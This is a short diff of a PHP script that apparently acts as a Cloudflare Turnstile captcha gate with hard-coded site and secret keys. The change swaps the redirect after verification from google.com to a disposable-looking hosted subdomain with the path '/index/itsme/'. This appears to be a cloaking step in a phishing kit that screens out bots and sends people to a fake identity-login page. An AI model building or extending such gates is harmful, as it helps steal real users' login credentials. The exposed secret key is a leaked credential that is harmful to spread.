@@ -5,7 +5,7 @@ session_start();
 // Configuration
 $secretKey = "0x4AAAAAAFJlrqj4gsLEqQxLj-k1cXggsmk";
 $siteKey = "0x4AAAAAAFJlrovk3z9fpjMf";
-$redirectUrl = "https://google.com";
+$redirectUrl = "https://s1260843.ha025.t.mydomain.zone/index/itsme/";
 $error = "";
 
 // Verification Turnstile
